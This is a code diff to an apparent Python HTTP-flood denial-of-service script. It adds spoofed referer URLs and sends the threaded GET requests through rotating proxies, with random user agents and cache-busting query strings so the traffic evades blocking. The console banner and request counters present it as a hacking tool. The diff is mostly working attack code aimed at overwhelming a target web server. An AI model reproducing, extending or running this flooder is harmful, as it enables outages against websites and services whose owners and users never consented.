@@ -110,6 +110,7 @@ def getUserAgent():
 def referer_list():
     try :
         global headers_referers
+        headers_referers.append('https://user.gtarcade.com/site/login?rurl=')
         headers_referers.append('http://e9geolgzk6.com/iuqasfg3?dbqfdh=34&refer=')
         headers_referers.append('https://iplookup.flagfox.net/?host=')
         headers_referers.append("https://foradoar.org/")
@@ -175,6 +176,7 @@ def referer_list():
         headers_referers.append('http://vk.com/profile.php?redirect=')
         headers_referers.append('http://www.usatoday.com/search/results?q=')
         headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
+        headers_referers.append('https://v1.push-time.com/notifications/pub2/cpm/3/infinity/index.html?p1=')
         headers_referers.append('https://browsergames2018.com/bestgames/custom/anime/oven/hentai/index.php?country_code=VN&p1=')
         headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
         headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
@@ -1369,12 +1371,12 @@ class Requested(threading.Thread):
     def run(self):
         referer_list()
         global Lock
+        global headers
         global listaproxy
         global request_counter
         global Request_counter
         while Close == False:
             try:
-                response = requests.get(url + "?" + buildLock(random.randint(3,10)))
                 request = urllib2.Request(url + "?" + buildLock(random.randint(3,10)))
                 request.add_header("User-Agent", random.choice(getUserAgent()))
                 request.add_header("Referer", random.choice(headers_referers))
@@ -1391,7 +1393,8 @@ class Requested(threading.Thread):
                 urllib2.urlopen(request)
                 request_counter += 1203
                 Request_counter += 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
-                urllib2.urlopen(request)
+                proxies = {'http':listaproxy[index_proxy]}
+                response = requests.get(url + "?" + buildLock(random.randint(3,10)),proxies=proxies,timeout=None)
                 status_codes = response.status_code
                 Lock.acquire()
                 print("[Root@Kali://P3terJ4mes>Status Server {}\n").format(status_codes)
